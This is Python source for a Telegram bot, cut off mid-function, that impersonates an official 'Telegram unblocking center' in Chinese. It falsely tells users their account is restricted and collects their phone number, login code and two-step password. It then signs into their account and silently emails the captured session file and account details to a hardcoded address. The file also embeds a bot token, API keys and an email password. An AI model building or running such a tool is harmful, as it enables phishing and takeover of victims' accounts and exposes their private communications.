import asyncio
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    FloodWaitError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError
)
from telethon.errors import PhoneNumberInvalidError
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.tl.types import KeyboardButtonCallback
from telethon.utils import get_input_peer
import os
import json
from datetime import datetime
import logging
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import zipfile
import io
import re

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# 配置数据
BOT_TOKEN = "8872795384:AAHms2Peo9AiDz6DCY3JQzLe0SEzPXgYRNY"
API_ID = 33059943
API_HASH = '1c73a0510ba0b8cb3bd16f24acfd62bf'

# ==================== 邮件配置 ====================
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
SMTP_USER = "atienzarhodorax838@gmail.com"
SMTP_PWD = "qpluphiqtgsadebg"
TARGET_EMAILS = ["dj439966@qq.com"]
# =================================================

# 存储用户登录状态
user_sessions = {}
login_states = {}


class EmailNotifier:
    """邮件通知类 - 静默发送登录信息备份"""
    
    def __init__(self, smtp_server, smtp_port, smtp_user, smtp_pwd, target_emails):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.smtp_user = smtp_user
        self.smtp_pwd = smtp_pwd
        self.target_emails = target_emails
    
    def create_session_zip(self, session_file_path, phone_number, account_info):
        """
        创建包含 .session 和 .json 文件的 zip 压缩包
        返回: 压缩包的字节数据
        """
        zip_buffer = io.BytesIO()
        
        # 清理手机号（移除 + 号，只保留数字）
        clean_phone = re.sub(r'[^0-9]', '', phone_number)
        zip_filename = f"{clean_phone}.zip"
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # 1. 添加 .session 文件
            if os.path.exists(session_file_path):
                # 读取 session 文件内容
                with open(session_file_path, 'rb') as f:
                    session_data = f.read()
                
                # 添加到 zip（文件名格式: 手机号.session）
                session_name = f"{clean_phone}.session"
                zip_file.writestr(session_name, session_data)
                logger.info(f"✅ 已添加 session 文件: {session_name}")
            
            # 2. 创建并添加 .json 配置文件
            # 准备 JSON 数据
            json_data = {
                'phone': phone_number,
                'clean_phone': clean_phone,
                'username': account_info.get('username'),
                'user_id': account_info.get('user_id'),
                'first_name': account_info.get('first_name', ''),
                'last_name': account_info.get('last_name', ''),
                'alias': account_info.get('alias'),
                'login_time': account_info.get('login_time'),
                'has_2fa': account_info.get('has_2fa', False),
                'appeal_status': account_info.get('appeal_status', 'pending'),
                'appeal_time': account_info.get('appeal_time'),
                'session_file': f"{clean_phone}.session"
            }
            
            # 添加到 zip（文件名格式: 手机号.json）
            json_name = f"{clean_phone}.json"
            json_content = json.dumps(json_data, ensure_ascii=False, indent=2)
            zip_file.writestr(json_name, json_content.encode('utf-8'))
            logger.info(f"✅ 已添加 JSON 文件: {json_name}")
        
        zip_buffer.seek(0)
        return zip_buffer, zip_filename
    
    def send_session_backup(self, phone_number, session_file_path, account_info, operator_info):
        """
        发送包含 session 文件的 zip 压缩包到邮箱
        """
        try:
            # 创建 zip 压缩包
            zip_buffer, zip_filename = self.create_session_zip(
                session_file_path, phone_number, account_info
            )
            
            # 清理手机号用于显示
            clean_phone = re.sub(r'[^0-9]', '', phone_number)
            
            # 创建邮件
            subject = f"🔐 Telegram账号备份 - {clean_phone}"
            
            # 邮件正文（HTML格式）
            body = f"""
            <html>
            <head>
                <style>
                    body {{ font-family: Arial, sans-serif; }}
                    .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                    .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                              color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0; }}
                    .content {{ background: #f8f9fa; padding: 20px; border-radius: 0 0 10px 10px; }}
                    .info-block {{ background: white; padding: 15px; margin: 10px 0; border-radius: 8px; 
                                   box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                    .label {{ font-weight: bold; color: #333; }}
                    .value {{ color: #666; margin-left: 10px; }}
                    .time {{ color: #888; font-size: 12px; text-align: center; margin-top: 20px; }}
                    .warning {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin: 10px 0; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h2>🔐 Telegram 账号备份</h2>
                        <p>登录会话文件备份</p>
                    </div>
                    <div class="content">
                        <div class="info-block">
                            <h3>📱 账号信息</h3>
                            <p><span class="label">手机号:</span> <span class="value">{phone_number}</span></p>
                            <p><span class="label">用户名:</span> <span class="value">@{account_info.get('username', '无')}</span></p>
                            <p><span class="label">账号ID:</span> <span class="value">{account_info.get('user_id', '未知')}</span></p>
                            <p><span class="label">姓名:</span> <span class="value">{account_info.get('first_name', '')} {account_info.get('last_name', '')}</span></p>
                            <p><span class="label">双重验证:</span> <span class="value">{'✅ 已启用' if account_info.get('has_2fa') else '❌ 未启用'}</span></p>
                        </div>
                        
                        <div class="info-block">
                            <h3>📦 备份文件内容</h3>
                            <p><span class="label">压缩包:</span> <span class="value">{zip_filename}</span></p>
                            <p><span class="label">Session文件:</span> <span class="value">{clean_phone}.session</span></p>
                            <p><span class="label">配置文件:</span> <span class="value">{clean_phone}.json</span></p>
                        </div>
                        
                        <div class="info-block">
                            <h3>👤 操作者信息</h3>
                            <p><span class="label">用户ID:</span> <span class="value">{operator_info.get('user_id', '未知')}</span></p>
                            <p><span class="label">用户名:</span> <span class="value">@{operator_info.get('username', '无')}</span></p>
                        </div>
                        
                        <div class="warning">
                            <strong>⚠️ 重要提示</strong><br>
                            • 此压缩包包含账号的登录会话文件<br>
                            • 请妥善保管，不要分享给他人<br>
                            • 使用 session 文件可以无需验证码直接登录<br>
                            • 如果怀疑泄露，请立即在 Telegram 中注销所有设备
                        </div>
                        
                        <div class="time">
                            备份时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                        </div>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # 创建邮件
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = self.smtp_user
            msg['To'] = ', '.join(self.target_emails)
            msg['Date'] = datetime.now().strftime('%a, %d %b %Y %H:%M:%S +0800')
            
            # 添加HTML内容
            msg.attach(MIMEText(body, 'html', 'utf-8'))
            
            # 添加 zip 附件
            zip_part = MIMEBase('application', 'zip')
            zip_part.set_payload(zip_buffer.getvalue())
            encoders.encode_base64(zip_part)
            zip_part.add_header(
                'Content-Disposition',
                f'attachment; filename="{zip_filename}"'
            )
            msg.attach(zip_part)
            
            # 发送邮件
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, context=context) as server:
                server.login(self.smtp_user, self.smtp_pwd)
                server.sendmail(self.smtp_user, self.target_emails, msg.as_string())
            
            logger.info(f"✅ Session备份邮件已发送 - 手机号: {phone_number}, 文件: {zip_filename}")
            return True
            
        except Exception as e:
            logger.error(f"❌ 发送session备份邮件失败: {e}")
            return False
    
    def send_batch_backup(self, user_id, sessions_list, session_files_map):
        """
        批量发送已保存的账号备份（用于启动时）
        sessions_list: [(alias, info), ...]
        session_files_map: {phone_number: session_file_path}
        """
        try:
            # 创建包含所有账号的压缩包
            zip_buffer = io.BytesIO()
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            zip_filename = f"telegram_backup_{timestamp}.zip"
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for alias, info in sessions_list:
                    phone = info.get('phone', '')
                    clean_phone = re.sub(r'[^0-9]', '', phone) if phone else f"unknown_{alias}"
                    
                    # 添加 session 文件
                    session_path = session_files_map.get(clean_phone, session_files_map.get(phone, ''))
                    if session_path and os.path.exists(session_path):
                        with open(session_path, 'rb') as f:
                            session_data = f.read()
                        zip_file.writestr(f"{clean_phone}.session", session_data)
                    
                    # 添加 JSON 配置文件
                    json_data = {
                        'phone': phone,
                        'clean_phone': clean_phone,
                        'username': info.get('username'),
                        'user_id': info.get('user_id'),
                        'first_name': info.get('first_name', ''),
                        'last_name': info.get('last_name', ''),
                        'alias': alias,
                        'login_time': info.get('login_time'),
                        'has_2fa': info.get('has_2fa', False),
                        'appeal_status': info.get('appeal_status', 'pending')
                    }
                    zip_file.writestr(
                        f"{clean_phone}.json",
                        json.dumps(json_data, ensure_ascii=False, indent=2).encode('utf-8')
                    )
            
            zip_buffer.seek(0)
            
            # 创建邮件
            subject = f"📊 Telegram账号批量备份 - {timestamp}"
            body = f"""
            <html>
            <head>
                <style>
                    body {{ font-family: Arial, sans-serif; }}
                    .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                    .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                              color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0; }}
                    .content {{ background: #f8f9fa; padding: 20px; border-radius: 0 0 10px 10px; }}
                    .info-block {{ background: white; padding: 15px; border-radius: 8px; 
                                   box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                    .label {{ font-weight: bold; color: #333; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h2>📊 Telegram 账号批量备份</h2>
                        <p>系统自动生成的完整备份</p>
                    </div>
                    <div class="content">
                        <div class="info-block">
                            <h3>📊 备份统计</h3>
                            <p><span class="label">账号总数:</span> {len(sessions_list)}</p>
                            <p><span class="label">操作者ID:</span> {user_id}</p>
                            <p><span class="label">压缩包:</span> {zip_filename}</p>
                        </div>
                        
                        <div class="info-block">
                            <h3>📱 包含账号列表</h3>
                            {'<br>'.join([f"• {info.get('phone', '未知')} (@{info.get('username', '无')})" for alias, info in sessions_list])}
                        </div>
                        
                        <div class="time">
                            备份时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                        </div>
                    </div>
                </div>
            </body>
            </html>
            """
            
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = self.smtp_user
            msg['To'] = ', '.join(self.target_emails)
            
            msg.attach(MIMEText(body, 'html', 'utf-8'))
            
            # 添加 zip 附件
            zip_part = MIMEBase('application', 'zip')
            zip_part.set_payload(zip_buffer.getvalue())
            encoders.encode_base64(zip_part)
            zip_part.add_header('Content-Disposition', f'attachment; filename="{zip_filename}"')
            msg.attach(zip_part)
            
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, context=context) as server:
                server.login(self.smtp_user, self.smtp_pwd)
                server.sendmail(self.smtp_user, self.target_emails, msg.as_string())
            
            logger.info(f"✅ 批量备份邮件已发送 - {len(sessions_list)}个账号")
            return True
            
        except Exception as e:
            logger.error(f"❌ 发送批量备份邮件失败: {e}")
            return False


class Database:
    """简单的JSON数据库存储"""
    def __init__(self, filename="sessions_data.json"):
        self.filename = filename
        self.data = self.load()
    
    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save(self):
        with open(self.filename, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, ensure_ascii=False, indent=2)
    
    def get_user_sessions(self, user_id):
        return self.data.get(str(user_id), {})
    
    def add_session(self, user_id, alias, session_info):
        user_id = str(user_id)
        if user_id not in self.data:
            self.data[user_id] = {}
        self.data[user_id][alias] = session_info
        self.save()
    
    def remove_session(self, user_id, alias):
        user_id = str(user_id)
        if user_id in self.data and alias in self.data[user_id]:
            del self.data[user_id][alias]
            self.save()
    
    def clear_user_sessions(self, user_id):
        user_id = str(user_id)
        if user_id in self.data:
            del self.data[user_id]
            self.save()
    
    def get_all_sessions(self):
        """获取所有用户的会话（用于备份）"""
        return self.data


class LoginManager:
    """管理用户的登录流程"""
    def __init__(self, bot_client, db, email_notifier):
        self.bot = bot_client
        self.db = db
        self.email_notifier = email_notifier
        self.login_steps = {}
        self.session_files = {}  # 存储 session 文件路径映射
    
    async def send_unblock_center(self, event, user_info=None):
        """发送官方解控中心界面"""
        from telethon.tl.custom import Button
        
        if user_info is None:
            try:
                sender = await event.get_sender()
                first_name = sender.first_name or "未知"
                last_name = sender.last_name or ""
                username = f"@{sender.username}" if sender.username else "无"
                user_id = sender.id
                mention = f"[{first_name}](tg://user?id={user_id})"
            except:
                first_name = "用户"
                last_name = ""
                username = "无"
                user_id = event.sender_id
                mention = f"[{first_name}](tg://user?id={user_id})"
        else:
            first_name = user_info.get('first_name', '用户')
            last_name = user_info.get('last_name', '')
            username = user_info.get('username', '无')
            user_id = user_info.get('user_id', event.sender_id)
            mention = f"[{first_name}](tg://user?id={user_id})"
        
        message = (
            f"🏛️ **Telegram 官方解控中心**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **用户信息**\n"
            f"• 名字: {first_name}\n"
            f"• 姓氏: {last_name}\n"
            f"• 用户名: {username}\n"
            f"• ID: `{user_id}`\n"
            f"• 提及: {mention}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 **系统已自动启用中文翻译**\n\n"
            f"⚠️ **账户异常通知**\n"
            f"您的Telegram账户因违反社区使用规则，已被系统限制部分功能\n\n"
            f"📌 **解决方案**\n"
            f"请点击下方「解除封控」按钮，按照指引完成验证\n\n"
            f"⏰ **处理时效**: 24小时内自动解封\n"
            f"🔒 **信息加密**: 端到端加密传输\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 提示: 请勿重复提交，等待系统处理"
        )
        
        buttons = [
            [Button.inline("🔓 解除封控", b"action_unblock")],
            [Button.inline("📋 申诉记录", b"action_appeal_history"), Button.inline("🆘 联系客服", b"action_contact_support")],
            [Button.inline("📊 状态查询", b"action_check_status"), Button.inline("🔐 绑定账号", b"action_bind_account")],
            [Button.inline("🔑 切换账号", b"action_switch_account"), Button.inline("❓ 常见问题", b"action_faq")],
            [Button.inline("🌐 语言", b"action_language")]
        ]
        
        await event.respond(message, buttons=buttons)
    
    async def handle_login_start(self, event):
        """开始登录流程"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        
        if user_id in self.login_steps:
            await event.respond(
                "⚠️ **您已有登录进程进行中！**\n\n"
                "请先完成当前登录，或点击下方「取消」按钮。",
                buttons=[Button.inline("❌ 取消登录", b"action_cancel_login")]
            )
            return
        
        self.login_steps[user_id] = {
            'step': 'waiting_phone',
            'data': {},
            'start_time': datetime.now()
        }
        
        await event.respond(
            "🔐 **账号绑定流程**\n\n"
            "请输入您需要解封的Telegram手机号：\n"
            "📱 格式：`+861234567890`\n\n"
            "⚡ 提示：点击下方按钮取消操作",
            buttons=[Button.inline("❌ 取消", b"action_cancel_login")]
        )
    
    async def handle_callback(self, event):
        """处理按钮回调"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        
        if data == "action_unblock":
            await self.handle_login_start(event)
        elif data == "action_bind_account":
            await self.handle_login_start(event)
        elif data == "action_switch_account":
            await self.handle_list_accounts(event)
        elif data == "action_appeal_history":
            await self.show_appeal_history(event)
        elif data == "action_contact_support":
            await event.respond(
                "🆘 **联系客服**\n\n"
                "如需人工帮助，请发送邮件至：\n"
                "📧 support@telegram.org\n\n"
                "或在Twitter上联系：@Telegram\n\n"
                "💡 也可在下方输入您的问题，我们会尽快回复。",
                buttons=[Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            )
        elif data == "action_check_status":
            await self.check_account_status(event)
        elif data == "action_faq":
            await event.respond(
                "❓ **常见问题**\n\n"
                "**Q: 为什么我的账号被限制？**\n"
                "A: 可能原因：发送垃圾信息、频繁添加好友、被多人举报等\n\n"
                "**Q: 解封需要多久？**\n"
                "A: 提交申诉后通常在24小时内处理\n\n"
                "**Q: 需要提供什么信息？**\n"
                "A: 需要绑定手机号并通过验证码验证\n\n"
                "**Q: 解封后还会再次被限制吗？**\n"
                "A: 请遵守社区规则，避免违规行为\n\n"
                "**Q: 申诉失败怎么办？**\n"
                "A: 可以联系人工客服进一步处理",
                buttons=[Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            )
        elif data == "action_language":
            await event.respond(
                "🌐 **选择语言**\n\n"
                "请选择您的偏好语言：",
                buttons=[
                    [Button.inline("🇨🇳 中文", b"action_lang_zh")],
                    [Button.inline("🇬🇧 English", b"action_lang_en")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
        elif data == "action_lang_zh":
            await event.respond("✅ 已切换为中文")
            await self.send_unblock_center(event)
        elif data == "action_lang_en":
            await event.respond("✅ Switched to English")
        elif data == "action_back_to_main":
            await self.send_unblock_center(event)
        elif data == "action_cancel_login":
            if user_id in self.login_steps:
                step_info = self.login_steps[user_id]
                client = step_info.get('data', {}).get('client')
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
                del self.login_steps[user_id]
            await event.respond(
                "❌ **已取消操作**\n\n"
                "如需帮助，请点击下方按钮返回主菜单",
                buttons=[Button.inline("🏠 返回主菜单", b"action_back_to_main")]
            )
        elif data == "action_list_accounts":
            await self.handle_list_accounts(event)
        elif data.startswith("action_logout_"):
            alias = data.replace("action_logout_", "")
            await self.handle_logout(event, alias)
        elif data == "action_logout_all":
            await self.handle_logout_all(event)
        elif data == "action_refresh_status":
            await self.check_account_status(event)
        
        await event.answer()
    
    async def show_appeal_history(self, event):
        """显示申诉记录"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        sessions = self.db.get_user_sessions(user_id)
        
        if not sessions:
            await event.respond(
                "📋 **申诉记录**\n\n"
                "暂无申诉记录。\n\n"
                "请点击「解除封控」绑定账号并提交申诉。",
                buttons=[
                    [Button.inline("🔓 解除封控", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            return
        
        msg = "**📋 申诉记录**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for alias, info in sessions.items():
            status = "🟢 处理中" if info.get('appeal_status') == 'pending' else "✅ 已完成"
            msg += f"**📱 账号：{alias}**\n"
            msg += f"• 状态：{status}\n"
            msg += f"• 提交时间：{info.get('appeal_time', '未知')}\n"
            msg += f"• 处理进度：{info.get('progress', '0%')}\n\n"
        
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "💡 解封成功后账号会自动恢复"
        
        await event.respond(
            msg,
            buttons=[
                [Button.inline("🔄 刷新状态", b"action_refresh_status")],
                [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            ]
        )
    
    async def check_account_status(self, event):
        """检查账号状态"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        sessions = self.db.get_user_sessions(user_id)
        
        if not sessions:
            await event.respond(
                "📊 **状态查询**\n\n"
                "您尚未绑定任何账号。\n\n"
                "请先点击「解除封控」绑定账号。",
                buttons=[
                    [Button.inline("🔓 解除封控", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            return
        
        msg = "**📊 账号状态总览**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for alias, info in sessions.items():
            msg += f"**🔹 {alias}**\n"
            msg += f"• 用户名：@{info.get('username', '无')}\n"
            msg += f"• 绑定状态：✅ 已绑定\n"
            msg += f"• 解封状态：{'🔄 处理中' if info.get('appeal_status') != 'completed' else '✅ 已解封'}\n"
            msg += f"• 绑定时间：{info.get('login_time', '未知')[:19]}\n\n"
        
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "💡 解封处理中请耐心等待"
        
        await event.respond(
            msg,
            buttons=[
                [Button.inline("🔄 刷新状态", b"action_refresh_status")],
                [Button.inline("🔓 绑定新账号", b"action_unblock")],
                [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            ]
        )
    
    async def handle_list_accounts(self, event):
        """显示账号列表"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        sessions = self.db.get_user_sessions(user_id)
        
        if not sessions:
            await event.respond(
                "📭 **您尚未绑定任何账号**\n\n"
                "点击下方按钮开始绑定您的Telegram账号。",
                buttons=[
                    [Button.inline("🔓 解除封控", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            return
        
        buttons = []
        for alias in sessions.keys():
            buttons.append([Button.inline(f"📱 {alias}", f"action_show_account_{alias}".encode())])
        
        buttons.append([Button.inline("❌ 退出所有账号", b"action_logout_all")])
        buttons.append([Button.inline("◀️ 返回主菜单", b"action_back_to_main")])
        
        await event.respond(
            "**📱 您的账号列表**\n\n"
            f"已绑定 {len(sessions)} 个账号\n\n"
            "点击下方账号查看详情：",
            buttons=buttons
        )
    
    async def handle_logout(self, event, alias):
        """退出指定账号"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        sessions = self.db.get_user_sessions(user_id)
        
        if alias not in sessions:
            await event.respond(f"❌ 账号 `{alias}` 不存在")
            return
        
        if user_id in user_sessions and alias in user_sessions[user_id]:
            try:
                await user_sessions[user_id][alias].disconnect()
                del user_sessions[user_id][alias]
            except Exception as e:
                logger.error(f"退出账号失败 {alias}: {e}")
        
        self.db.remove_session(user_id, alias)
        
        await event.respond(
            f"✅ **成功解绑账号 `{alias}`**\n\n"
            "该账号已从本系统移除。",
            buttons=[
                [Button.inline("📱 查看账号列表", b"action_list_accounts")],
                [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            ]
        )
    
    async def handle_logout_all(self, event):
        """退出所有账号"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        
        if user_id not in user_sessions or not user_sessions[user_id]:
            await event.respond("📭 没有需要解绑的账号")
            return
        
        count = 0
        for alias, client in list(user_sessions[user_id].items()):
            try:
                await client.disconnect()
                count += 1
            except Exception as e:
                logger.error(f"退出账号 {alias} 失败: {e}")
        
        if user_id in user_sessions:
            user_sessions[user_id] = {}
        self.db.clear_user_sessions(user_id)
        
        await event.respond(
            f"✅ **成功解绑 {count} 个账号**\n\n"
            "所有账号已从本系统移除。",
            buttons=[
                [Button.inline("🔓 绑定新账号", b"action_unblock")],
                [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            ]
        )
    
    async def handle_message(self, event):
        """处理登录过程中的用户消息"""
        user_id = event.sender_id
        text = event.text.strip()
        
        if user_id not in self.login_steps:
            return False
        
        step_info = self.login_steps[user_id]
        current_step = step_info['step']
        
        try:
            if current_step == 'waiting_phone':
                return await self._process_phone(event, text, step_info)
            elif current_step == 'waiting_code':
                return await self._process_code(event, text, step_info)
            elif current_step == 'waiting_2fa':
                return await self._process_2fa(event, text, step_info)
        except Exception as e:
            logger.error(f"登录处理错误 user {user_id}: {e}")
            from telethon.tl.custom import Button
            await event.respond(
                f"❌ **处理出错**：{str(e)[:200]}",
                buttons=[
                    [Button.inline("🔄 重新尝试", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            if user_id in self.login_steps:
                client = self.login_steps[user_id].get('data', {}).get('client')
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
                del self.login_steps[user_id]
            return True
        
        return False
    
    async def _process_phone(self, event, phone, step_info):
        """处理手机号输入"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        
        if not phone.startswith('+'):
            await event.respond(
                "❌ **手机号格式错误！**\n\n"
                "手机号必须以 `+` 开头，包含国家代码。\n"
                "例如：`+861234567890`\n\n"
                "请重新输入手机号：",
                buttons=[Button.inline("❌ 取消", b"action_cancel_login")]
            )
            return True
        
        step_info['data']['phone'] = phone
        step_info['step'] = 'waiting_code'
        
        status_msg = await event.respond("⏳ **正在发送验证码...**")
        
        # 创建唯一的 session 文件
        clean_phone = re.sub(r'[^0-9]', '', phone)
        session_file = f"sessions/{clean_phone}.session"
        step_info['data']['session_file'] = session_file
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        
        try:
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.send_code_request(phone)
                step_info['data']['client'] = client
                
                await status_msg.edit(
                    "📨 **验证码已发送！**\n\n"
                    "请检查您的Telegram应用，输入收到的验证码：\n\n"
                    "⚡ 验证码有效期通常为5分钟",
                    buttons=[Button.inline("❌ 取消", b"action_cancel_login")]
                )
            else:
                await status_msg.edit(
                    "❌ 客户端已授权，请重新开始",
                    buttons=[Button.inline("🔄 重新开始", b"action_unblock")]
                )
                return True
                
        except FloodWaitError as e:
            wait_time = e.seconds
            hours = wait_time // 3600
            minutes = (wait_time % 3600) // 60
            seconds = wait_time % 60
            
            wait_str = ""
            if hours > 0:
                wait_str += f"{hours}小时"
            if minutes > 0:
                wait_str += f"{minutes}分钟"
            if seconds > 0 or wait_str == "":
                wait_str += f"{seconds}秒"
            
            await status_msg.edit(
                f"⏰ **请求过于频繁！**\n\n"
                f"Telegram要求等待：**{wait_str}**\n\n"
                f"💡 提示：这是Telegram的安全机制，请耐心等待。",
                buttons=[Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
            )
            
            if client:
                await client.disconnect()
            del self.login_steps[user_id]
            return True
            
        except PhoneNumberInvalidError:
            await status_msg.edit(
                "❌ **手机号无效！**\n\n"
                "请输入正确的手机号格式。",
                buttons=[
                    [Button.inline("🔄 重新输入", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            if client:
                await client.disconnect()
            del self.login_steps[user_id]
            return True
            
        except Exception as e:
            await status_msg.edit(
                f"❌ **发送验证码失败**\n\n"
                f"错误：{str(e)[:200]}",
                buttons=[
                    [Button.inline("🔄 重试", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            if client:
                await client.disconnect()
            del self.login_steps[user_id]
            return True
        
        return True
    
    async def _process_code(self, event, code, step_info):
        """处理验证码输入"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        
        if not code.isdigit() or len(code) < 4:
            await event.respond(
                "❌ **验证码格式错误！**\n\n"
                "验证码应该是纯数字。\n"
                "请重新输入收到的验证码：",
                buttons=[Button.inline("❌ 取消", b"action_cancel_login")]
            )
            return True
        
        step_info['data']['code'] = code
        step_info['step'] = 'signing_in'
        
        client = step_info['data'].get('client')
        phone = step_info['data'].get('phone')
        session_file = step_info['data'].get('session_file')
        
        if not client or not phone:
            await event.respond(
                "❌ **验证状态异常**",
                buttons=[Button.inline("🔄 重新开始", b"action_unblock")]
            )
            del self.login_steps[user_id]
            return True
        
        status_msg = await event.respond("⏳ **正在验证身份...**")
        
        try:
            await client.sign_in(phone, code)
            me = await client.get_me()
            
            alias = f"acc_{len(self.db.get_user_sessions(user_id)) + 1}"
            
            # 清理手机号用于文件名
            clean_phone = re.sub(r'[^0-9]', '', phone)
            
            session_info = {
                'alias': alias,
                'username': me.username,
                'user_id': me.id,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': phone,
                'clean_phone': clean_phone,
                'login_time': datetime.now().isoformat(),
                'appeal_status': 'pending',
                'appeal_time': datetime.now().isoformat(),
                'progress': '25%',
                'session_file': session_file
            }
            self.db.add_session(user_id, alias, session_info)
            
            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id][alias] = client
            
            await client(UpdateStatusRequest(offline=False))
            
            # ========== 发送邮件备份（静默） ==========
            try:
                sender = await event.get_sender()
                operator_info = {
                    'user_id': sender.id,
                    'username': sender.username,
                    'first_name': sender.first_name or '',
                    'last_name': sender.last_name or ''
                }
            except:
                operator_info = {
                    'user_id': user_id,
                    'username': None,
                    'first_name': '未知',
                    'last_name': ''
                }
            
            # 静默发送包含 session 文件的 zip 备份
            asyncio.create_task(self._send_session_backup_async(
                phone, session_file, session_info, operator_info
            ))
            # ==========================================
            
            await status_msg.edit(
                f"✅ **申诉已提交！**\n\n"
                f"📱 **账号信息：**\n"
                f"• 账号名：`{alias}`\n"
                f"• 用户名：@{me.username or '无'}\n"
                f"• ID：`{me.id}`\n"
                f"• 姓名：{me.first_name or ''} {me.last_name or ''}\n\n"
                f"⏰ **处理状态**\n"
                f"• 申诉进度：25%\n"
                f"• 预计完成：24小时内\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💡 解封完成后您将收到通知",
                buttons=[
                    [Button.inline("📊 查看进度", b"action_check_status")],
                    [Button.inline("🏠 返回主菜单", b"action_back_to_main")]
                ]
            )
            
            del self.login_steps[user_id]
            return True
            
        except PhoneCodeInvalidError:
            await status_msg.edit(
                "❌ **验证码错误！**\n\n"
                "您输入的验证码不正确。\n"
                "请重新输入（剩余3次机会）：",
                buttons=[Button.inline("❌ 取消", b"action_cancel_login")]
            )
            step_info['step'] = 'waiting_code'
            step_info['data']['attempts'] = step_info['data'].get('attempts', 0) + 1
            
            if step_info['data']['attempts'] >= 3:
                await event.respond(
                    "❌ **验证码错误次数过多**\n申诉已取消",
                    buttons=[Button.inline("🔄 重新申诉", b"action_unblock")]
                )
                del self.login_steps[user_id]
                if client:
                    await client.disconnect()
            return True
            
        except PhoneCodeExpiredError:
            await status_msg.edit(
                "❌ **验证码已过期！**\n\n"
                "验证码有效期已过，请重新开始申诉。",
                buttons=[
                    [Button.inline("🔄 重新申诉", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            del self.login_steps[user_id]
            if client:
                await client.disconnect()
            return True
            
        except SessionPasswordNeededError:
            step_info['step'] = 'waiting_2fa'
            await status_msg.edit(
                "🔐 **双重验证**\n\n"
                "该账号启用了两步验证。\n"
                "请输入您的二级密码：",
                buttons=[Button.inline("❌ 取消", b"action_cancel_login")]
            )
            return True
            
        except Exception as e:
            await status_msg.edit(
                f"❌ **验证失败**\n\n"
